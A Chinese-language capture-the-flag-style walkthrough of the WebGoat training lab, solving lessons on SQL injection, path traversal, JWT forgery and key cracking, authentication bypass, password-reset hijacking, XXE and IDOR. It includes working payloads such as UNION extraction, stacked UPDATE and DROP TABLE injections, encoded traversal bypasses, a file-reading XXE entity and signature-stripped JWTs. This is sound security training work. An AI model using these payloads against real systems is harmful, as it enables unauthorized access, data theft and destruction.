
# Webgoat

## 一、环境搭建

### Windows下

1. 配置jdk（已经配好）

![输入图片说明](https://s2.loli.net/2023/03/14/oHyNg6mhJIMGRY3.png)

2. 设置浏览器代理

配置代理服务器 127.0.0.1:8008

3.下载安装Webgoat

在 Github 中下载 Webgoat 5.4，打开 .bat 文件即可：

![输入图片说明](https://s2.loli.net/2023/03/14/DFvZ7q5LoWnNw9d.png)

再打开 localhost:8080/WebGoat/attack，即可运行 Webgoat：

![输入图片说明](https://s2.loli.net/2023/03/14/IkURKrlcaZgneuQ.png)

但感觉界面有点问题 (?)，没有某些应该被提问的问题：

![输入图片说明](https://s2.loli.net/2023/03/14/zDLtTc9N7Rg2BbS.png)

> Written with [StackEdit中文版](https://stackedit.cn/).

### Linux下

搭一个Kali下的

1. 先在 Kali 下进行 Docker 配置

```
sudo apt-get install docker.io
sudo apt-get install docker-ce
sudo apt-get update
```
*（证书出现问题，更新一下证书即可）*

2. 获取Webgoat

```
sudo docker pull webgoat/webgoat-8.0
```

3. 连接Webgoat

```
sudo docker run -d -p 8888:8888 -p 8080:8080 -p 9090:9090 webgoat/goatandwolf
```

![输入图片说明](https://s2.loli.net/2023/03/14/AVKEBWz8OIaiQ2y.png)

4. 打开浏览器，输入 http://127.0.0.1:8080/WebGoat ，注册登录即可

![输入图片说明](https://s2.loli.net/2023/03/14/sRomKprDGWP26Vq.png)

~~（看着舒服多了）~~

## 二、通关流程

### General

使用 ZAP 进行 http 抓包，首先要配置 ZAP 端口（否则默认端口8080会和Webgoat冲突）

![输入图片说明](https://s2.loli.net/2023/03/14/pv9Kl3L2o4RfjM6.png)

然后可以通过右上角浏览器图标直接进入经过ZAP代理的浏览器，再输入Webgoat的url

#### 1、HTTP Basics

实现一个接收字符串并回传字符串的 reverse 的功能，输入一个试试，并查看ZAP抓到的包：

![输入图片说明](https://s2.loli.net/2023/03/14/GWagE2j6dX1mfBz.png)

可以看出使用POST方法传递参数（还可以通过观察 url 得知）

![输入图片说明](https://s2.loli.net/2023/03/14/93jJm1sHQLyW25v.png)

问题中还有一个magic number，不知道，先随便输入一个看看ZAP：

![输入图片说明](https://s2.loli.net/2023/03/14/LEjATyXwvFVJauD.png)

数据栏中 magic number 值为55

![输入图片说明](https://s2.loli.net/2023/03/14/SnFp65jwLV7MmUd.png)

#### 2、HTTP Proxies

前面的是一些 ZAP 使用帮助，题目是拦截并修改一个请求：

![输入图片说明](https://s2.loli.net/2023/03/15/vnVCKZj3yeRb6QD.png)

首先需要设置一个断点，并设置过滤的条件：

![输入图片说明](https://s2.loli.net/2023/03/15/j4vowdmk1MXt8ND.png)

然后点击绿色按钮，开始监听/拦截：

![输入图片说明](https://s2.loli.net/2023/03/15/gvru3zhDOK67QPe.png)

在浏览器提交一个字符串，在 ZAP “拦截”中查看：

![输入图片说明](https://s2.loli.net/2023/03/15/dSkIGQ9hfbPMcJg.png)

可在此页面直接进行修改，修改后点击“提交”，即完成任务。

![输入图片说明](https://s2.loli.net/2023/03/15/HtkxviSVlARcG6g.png)

**同样的**，可以通过查看历史请求，右键

![输入图片说明](https://s2.loli.net/2023/03/15/O4BlKck6uxL9d5t.png)

在新窗口中直接修改请求，并点击右侧 Send：

![输入图片说明](https://s2.loli.net/2023/03/15/ijzaNVtBqK9vI4A.png)

也可成功。

#### 3、Develop Tools

1. 在 F12 的控制台中，输入 webgoat.customjs.phoneHome() 即可，复制下回送的信息即可

![输入图片说明](https://s2.loli.net/2023/03/15/l7C4UERxcnWS5DZ.png)

*出现的两个问题*：控制台不允许粘贴，输入 allow pasting 即可；另外使用上面的ZAP代理的浏览器发送函数没有回送，切换浏览器收到

2. 点击 go 产生请求，查看 F12 的网络界面，搜索 networkNum 即可找到对应值

![输入图片说明](https://s2.loli.net/2023/03/15/vFYAS283G9aCznV.png)

#### Crypto Basics

1. 直接 Base64 解码：

![输入图片说明](https://s2.loli.net/2023/03/16/3pV2WJvhEGTDOC5.png)

2. xor解码：

https://www.sysman.nl/wasdecoder/

![输入图片说明](https://s2.loli.net/2023/03/16/oO6hWZJkspRfCc5.png)

3. 解密 hash 字符串：

网站：cmd5

kali 工具：
hash-identifier 判断加密算法：

![输入图片说明](https://s2.loli.net/2023/03/16/54tGkLRZsIxAEBw.png)

用 hashcat 破解

4. 根据 RSA 私钥求模量，用私钥签名该模量：

使用 OpenSSL，首先创建一个存有密钥的文件，然后命令行输入指令求模量：
```
openssl rsa -in ./private.txt -modulus
```

![输入图片说明](https://s2.loli.net/2023/03/16/d9lhxiKt8n7pjJq.png)

签名：
```
echo -n "AADCD084A06B9BDD200E1DDD6985839EA8179826293F1456D0A22A6C1CFC21329C2A6512B4C6162AD13573D6A7D8DD157B089623B4ABDB515B5D7190875EB2C4AFBD45C43515F03A3E2943242AF4E8E8E8D0DE566FC34BEC7C33AA902E4ADA855E3896B23AF80536137E70CC0BB26DDE56B934AE85674D6153EF6E66A63F2DF957B56871306407A0B549B10A5CF10576ED5A60D60C9971E8C850568CB120E9EF2A0A4F5142CCEAA49E0A0339A6A2335E5941A2BAFAC7FBB312211D0FD778CF168AAAAFCF579C9B2106F45A01FFBB29501025C90BC9F18502DBB8F9260CA01F1F10CB86342CF48DE18A3152CB9BB83B8AB275E911AE69F0DE361B1A552B3D91CD" | openssl dgst -sign ./private.txt -sha256 -out ./dgst.txt 
```
*openssl dgst -sign 进行签名*

编码（否则是乱码）
```
base64 ./dgst.txt > result
```
result 即为签名后文件

5. docker

首先按照要求，输入`sudo docker run -d webgoat/assignments:findthesecret`
然后查看容器列表：`sudo docker ps`
进入对应容器：`sudo docker exec -it d0 /bin/bash`

接下来要求 getting access to the password file located in /root. 
没有权限，`su` 需要密码

退出`exit`
以 root 身份重新进入容器`sudo docker exec --user root -it d0 /bin/bash `
查看 /root 目录下文件并 cat 内容`ls /root/` `cat /root/secret`

![输入图片说明](https://s2.loli.net/2023/03/16/lhqdDew367NErTB.png)

用此文件执行 Webgoat 给出的命令
```
echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -kfile /root/secret
```
得出信息

### Injection

#### SQL Injection(intro)

1. select 语句的使用
```
SELECT department FROM Employees WHERE first_name='Bob';
```
2. update 语句的使用
```
UPDATE Employees SET department='Sales' WHERE first_name='Tobi';
```
3. alter 语句的使用
```
ALTER TABLE employees ADD phone varchar(20);
```
4. grant 语句的使用
```
GRANT ALL ON grant_rights TO unauthorized_user;
```
5. 字符串（单引号）注入
```
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
```
6. 数字注入
```
SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
```
7. 字符串注入（破坏机密性）
```
SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A' or '1'='1';
```
8. 破坏完整性（添加新的语句）
```
SELECT * FROM employees WHERE last_name = ‘Smith' AND auth_tan ='3SL99A';UPDATE employees  SET salary=100000 WHERE last_name='Smith';
```
9. 破坏可用性
```
1’;drop table access_log;--
```  
#### SQL Injection(advanced)

1. UNION使用：
```
SELECT * FROM user_data WHERE last_name = 'Dave' Union select userid,user_name,password,cookie,user_name,user_name,userid from user_system_data;--'
```
注意使用UNION时，列号和数据类型需要一一匹配
同样可以添加新的语句：
```
SELECT * FROM user_data WHERE last_name = 'Dave' OR 1=1;SELECT * FROM user_system_data;--‘

```
2. SQL盲注

> 参考了https://blog.csdn.net/u013553529/article/details/82794814

（1）寻找注入点

这里练习使用 sqlmap。
~~首先使用 ZAP 抓一个注册时的包，获取 sqlmap 需要的参数：cookie，url，请求body~~
![输入图片说明](https://s2.loli.net/2023/03/17/Iqm51zC3kbYpuxr.png)
~~使用参数命令检测不出漏洞？~~
右键保存为RAW，使用命令：`sqlmap -r 桌面/1.raw`，可以检测出注册用户名存在注入漏洞。

（2）探测密码

**继续使用 sqlmap**
```
sqlmap --no-cast -r 文件路径 --dbs#查看数据库
```
unable 权限不够，手工注入

**手工注入**

首先要知道 Tom 用户名：在注册界面试一下，当注册“tom”时，提示用户已存在，故用户名为 tom

然后进行**猜列名**，猜测密码对应列名字，猜其为 password：`tom' or password='12345`

![输入图片说明](https://s2.loli.net/2023/03/17/z2oIhBY9WxfnVpl.png)

说明存在此列，*若不存在（如输入password2），会回显*

> Sorry the solution is not correct, please try again
 
 然后通过**Burpsuite**，对密码进行爆破：
 打开 Burpsuite，在 Proxy 中 Open Broswer，进入 WebGoat 注入页，打开 Intercept ，注册，在 Burpsuite 端 Forword 到该请求页，右键 Send to Intruder
 在 Intruder Position页编辑请求，注意 Type 需改为 Cluster Bomb（否则只能编辑一个Payload）：
![输入图片说明](https://s2.loli.net/2023/03/18/v1YfHnuseUJEcQ9.png)

在 payload 界面设置字典，分别设置 Payload Set 1,2：
![输入图片说明](https://s2.loli.net/2023/03/18/LEWVyPXFNc65dTC.png)

Start Attack（需要等一阵）
根据 Length 进行排序：
![输入图片说明](https://s2.loli.net/2023/03/18/9xRigFKCXaJMUo7.png)
*想通过高亮筛选再排序，但并没有用处？？*

可知密码为：`thisisasecretfortomonly`

####  Path Traversal

1. 修改请求头更改上传文件位置：

上传一下头像，查看 ZAP 记录，根据电子邮件等的提交顺序和位置，推测第一个test为文件位置，修改为 `../test`
![输入图片说明](https://s2.loli.net/2023/03/19/FEsZvTgyaVYGult.png)

Send 重放，成功

2. 双写绕过：

重新尝试`../`，但是失败了
由题目可知被 remove 掉了，尝试双写绕过（用外层包裹内层）`....//`
成功

3. 修改文件名

题目中说用户名被验证保护了，所以通过修改文件名进行提交，将文件名改为`../1.txt`

4. 
*开始抓不到随机图片的包，然后突然又能抓到了？？*
响应中：
![输入图片说明](https://s2.loli.net/2023/03/19/32NkchW4fdPArnb.png)

要找的图片应该在上一级目录中，图片为`id`，方法为 GET，所以使用`?id=../path-traversal-secret`，重发，提示不合法：
![输入图片说明](https://s2.loli.net/2023/03/19/KuCYsZIJ3QiwNq2.png)

不适用字符，使用`%2e%2e%2f`，提示`bad request`
双写`%2e%2e%2f%2e%2e%2f`，成功
![输入图片说明](https://s2.loli.net/2023/03/19/sG1MZ4qO6VnwLgD.png)

计算一下用户名的SHA-512值，提交，成功

### Broken Authentication

#### Authentication Bypass

密保问题的绕过
在例子中，通过**删除请求中的密保问题**再发送，实现了绕过
在题目中，通过将 **question0，question1 改为 question2，question3**，绕过密保：
![输入图片说明](https://s2.loli.net/2023/03/19/jHeVq5EgQz7rF1J.png)

#### JWT Token

1.  JWT组成
将给出的 JWT 进行 base64 解码，可以看出 user_name 为user：
![输入图片说明](https://s2.loli.net/2023/03/19/mYTyc56BvhaWbQL.png)

2. 修改JWT
需要以管理员身份登录，以重置票数，需要修改 JWT 来解决
在 `jwt.io` 中进行解码：![输入图片说明](https://s2.loli.net/2023/03/20/FStwjDZLlkWGciK.png)

	参考下一页的 solution，需要更改admin 为 `true`，**加密算法置空**，*但似乎这里改不了加密算法？*，只更改 admin 布尔值会提示 valid
	不过同时删掉签名尾部，就可以了
![输入图片说明](https://s2.loli.net/2023/03/20/2JLzFbicmBv4l8g.png)
	然后就可以重置票数了
3. 爆破 JWT 私钥
已知一个 JWT 的值，获取对应的私钥以更改 payload 的内容
直接暴力破解，使用 jwtcrack-master：`python crackjwt.py JWT dictionary.txt`
![输入图片说明](https://s2.loli.net/2023/03/20/5Ceqrp293UjWt47.png)
得出密钥为`available`
*也可以用`hashcat -m 16500`暴力破解 JWT*
解码一下 JWT
![输入图片说明](https://s2.loli.net/2023/03/20/oBnxT4aJgi8Fezs.png)

	发现其中还包含有效期（一分钟），需要延后截止时间 exp，然后修改用户名为 Webgoat 即可：
![输入图片说明](https://s2.loli.net/2023/03/20/3ShsWPKNUTERaXO.png)
4. 更改时间戳/使用刷新令牌
**方法一**
![输入图片说明](https://s2.loli.net/2023/03/20/eNxrWyCvKdzU1b4.png)

	在这里可以看到之前的令牌：可以看到时间戳已经过期，修改一下，然后删掉后面的签名部分：
![输入图片说明](https://s2.loli.net/2023/03/20/bquUzgc1DtM2e5v.png)
提交一下付款，然后在这里添加 `Authorization：JWT`![输入图片说明](https://s2.loli.net/2023/03/20/sUGY4bTpCiQZjgO.png)
成功
~~**方法二**~~
~~刷新一下，用本账号登录：
![输入图片说明](https://s2.loli.net/2023/03/20/4mvaSVx7WTbMNFH.png)
会返回新的访问令牌和刷新令牌：
![输入图片说明](https://s2.loli.net/2023/03/20/GxMpNwKvgASZQ9U.png)
用自己的刷新令牌刷新 TOM 的访问令牌，但是找不到获取新Token的请求？~~
5. sql 注入和令牌修改综合
删除一下 TOM，显然失败了，查看一下 token：
![输入图片说明](https://s2.loli.net/2023/03/20/8msvXuteW5gaRiG.png)
代表密钥需要通过 kid 从数据库中查找到（密钥以唯一 id 标识的形式存储在 jwt_keys 中），所以这里可以利用 sql 注入，将 kid 变成我们想要的值。此外，再改一下时间戳和用户名：
![输入图片说明](https://s2.loli.net/2023/03/20/MXNUex95smWVkg3.png)

把新的 token 替换，成功

#### password
1. 简单的邮件找回密码
2. 简单的安全问题爆破
```
	tom purple
```
3. 安全问题为什么不安全
4. 修改密码重置链接
把请求得到的密码重置链接中的地址修改为我们可以拦截到的地址。即把 8080 端口改为 9090，这样就可以从 WebWolf 拦截到请求：
![输入图片说明](https://s2.loli.net/2023/03/21/24vWX8SlbRpkaCm.png)

	可以在 WebWolf 中查看到拦截到的请求：
![输入图片说明](https://s2.loli.net/2023/03/21/8jTU1t62db5CMeh.png)

	**但 url 有点问题，并不能修改密码？**
#### Secure Passwords
强密码
### Sensitive Data Exposure

Login一下 可以发现数据，用该数据登录即可：

![输入图片说明](https://s2.loli.net/2023/03/21/w5PJBRxhodzNW8D.png)``

### XXE
全称XML External Entity attack，XML外部实体攻击。因为XML允许从外部引入实体，并且该请求是由服务器处理过程发生的，是受信任的，攻击者就可以通过XXE获取到服务器上重要的数据，或者通过引入自己写的代码进行其他操作。XML同样从抓到的包中获取。

1. 简单 XXE 
提交个评论，抓个包：

![输入图片说明](https://s2.loli.net/2023/03/22/4UTVX9hrxDni57S.png)

`<text></text`>标签之前的内容是会显示在评论区的，因此如果在此处引用外		部实体，外部实体的内容也是可以显示在评论区的。
修改一下，在request报文中的xml代码中增加DTD，并在其中定义外部实体，其内容是"file:///"，然后引用外部实体：
```
<?xml version="1.0"?>
<!DOCTYPE cat [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>  <text>&root;</text></comment>
```
重发，实现目标：
![输入图片说明](https://s2.loli.net/2023/03/22/T1LDAG9m8i4MUhI.png)

2. 修改 Content-Type
抓个包，发现 Content-Type 为 json：
![输入图片说明](https://s2.loli.net/2023/03/26/HrqTSEJl8xkmwhR.png)
改为 xml，再使用上题的代码，重发成功。

3. XXE盲注
参考https://blog.csdn.net/XenonL/article/details/104528423

### Broke Access Control

#### Insecure Direct Object References
越权漏洞

1. 以 tom 身份登录即可
2. 简单抓个包，就可以发现回复中有不回显在界面中的信息：
![输入图片说明](https://s2.loli.net/2023/03/26/UNwgbiZYSOaQoXt.png)

3. 这一页要求用直接对象引用的方式来查看自己的profile
从上一次抓包，可以看到请求`GET http://127.0.0.1:8080/WebGoat/IDOR/profile`，再加上 tom 的 userid 为2342384，推测 profile 的 url 为`WebGoat/IDOR/profile/2342384`
4. 看其他用户的profile
可以看出通过 userid 识别不同库，所以需要首先知道其他用户的 id，使用burpsuite


<!--stackedit_data:
eyJoaXN0b3J5IjpbMTkwNDI0ODIxNSwtMjA5ODYyODk2NSwxOD
Y3MTgwMjE1LDE4MjI4NDY3MjcsMTU5OTE2ODU1MCwtMTM5OTIy
Njc5OSwxMDk4NzQxNjQxLDIwMjQwNTc5MTgsMTgwNTU3NDY3Mi
w4MDg3Nzk0NDUsMTUxMDg1MDkwMywtMTQ0NzM4ODU3MiwtMTM1
NzMzOTU5NCw5MTUzMjY1MTQsLTQ5MDQwMTk5OCwxODUwNzU4Mj
E4LDQ5NTQxNDc5NSwxNzA0Mjg0MzYwLDE4OTI1OTA5NjQsOTkw
NjI0ODZdfQ==
-->